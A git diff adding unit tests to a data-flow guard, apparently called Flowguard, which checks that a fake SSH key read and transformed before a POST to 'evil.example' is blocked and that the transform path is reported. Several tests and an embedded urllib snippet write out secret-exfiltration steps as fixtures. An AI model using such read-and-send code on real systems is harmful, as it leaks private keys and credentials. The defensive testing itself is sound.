@@ -46,6 +46,53 @@ class RuntimeReportTests(unittest.TestCase):
             self.assertIn(f"file:{secret_path}", report.violations[0].sources)
             self.assertIsNotNone(report.violations[0].timestamp)
 
+    def test_report_includes_transform_path_for_blocked_payload(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            secret_path = Path(tmpdir) / "id_rsa"
+            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
+            runtime = FlowguardRuntime(
+                secret_paths=[secret_path],
+                http_transport=FakeHttpTransport(),
+            )
+
+            with runtime.open(secret_path) as handle:
+                secret = handle.read()
+            payload = secret.replace("PRIVATE", "PUBLIC").lower().encode("utf-8")
+
+            with self.assertRaises(FlowguardBlocked):
+                runtime.http.post("https://evil.example/upload", data=payload)
+
+            transforms = report_transform_operations(runtime.report())
+
+            self.assertEqual(
+                transforms,
+                ["str.replace", "str.lower", "str.encode"],
+            )
+
+    def test_report_includes_transform_path_from_nested_payload(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            secret_path = Path(tmpdir) / "id_rsa"
+            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
+            runtime = FlowguardRuntime(
+                secret_paths=[secret_path],
+                http_transport=FakeHttpTransport(),
+            )
+
+            with runtime.open(secret_path) as handle:
+                secret = handle.read()
+            payload = {"request": {"body": [secret.strip().encode("utf-8")]}}
+
+            with self.assertRaises(FlowguardBlocked):
+                runtime.http.post("https://evil.example/upload", data=payload)
+
+            report = runtime.report()
+
+            self.assertEqual(report.violations[0].labels, ["Secret"])
+            self.assertEqual(
+                report_transform_operations(report),
+                ["str.strip", "str.encode"],
+            )
+
     def test_report_summarizes_allowed_network_send(self) -> None:
         transport = FakeHttpTransport()
         runtime = FlowguardRuntime(http_transport=transport)
@@ -59,6 +106,7 @@ class RuntimeReportTests(unittest.TestCase):
         self.assertEqual(report.summary.allowed_send_count, 1)
         self.assertEqual(report.allowed_sends[0].target, "https://telemetry.example/event")
         self.assertEqual(report.allowed_sends[0].labels, [])
+        self.assertEqual(report.allowed_sends[0].transforms, [])
 
     def test_report_writes_json_and_jsonl(self) -> None:
         with tempfile.TemporaryDirectory() as tmpdir:
@@ -88,6 +136,40 @@ class RuntimeReportTests(unittest.TestCase):
         self.assertEqual(result.globals["answer"], 2)
         self.assertNotIn("FLOWGUARD_CODE_BODY_DO_NOT_EXPORT", report_json)
         self.assertIn("code_hash", report_json)
+
+    def test_generated_code_f_string_transform_path_is_exported(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            secret_path = Path(tmpdir) / "id_rsa"
+            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
+            runtime = FlowguardRuntime(secret_paths=[secret_path])
+            code = """
+import urllib.request
+with open(secret_path) as handle:
+    secret = handle.read()
+payload = f"key={secret}".encode("utf-8")
+req = urllib.request.Request(url, data=payload, method="POST")
+urllib.request.urlopen(req)
+"""
+
+            with self.assertRaises(FlowguardBlocked):
+                runtime.run_python(
+                    code,
+                    inputs={
+                        "secret_path": str(secret_path),
+                        "url": "https://evil.example/upload",
+                    },
+                )
+
+            report_json = runtime.report().to_json()
+
+            self.assertIn("str.format_value", report_json)
+            self.assertIn("str.joined", report_json)
+            self.assertIn("str.encode", report_json)
+            self.assertNotIn("PRIVATE KEY", report_json)
+
+
+def report_transform_operations(report: FlowguardReport) -> list[str]:
+    return [step["operation"] for step in report.violations[0].transforms]
 
 
 if __name__ == "__main__":
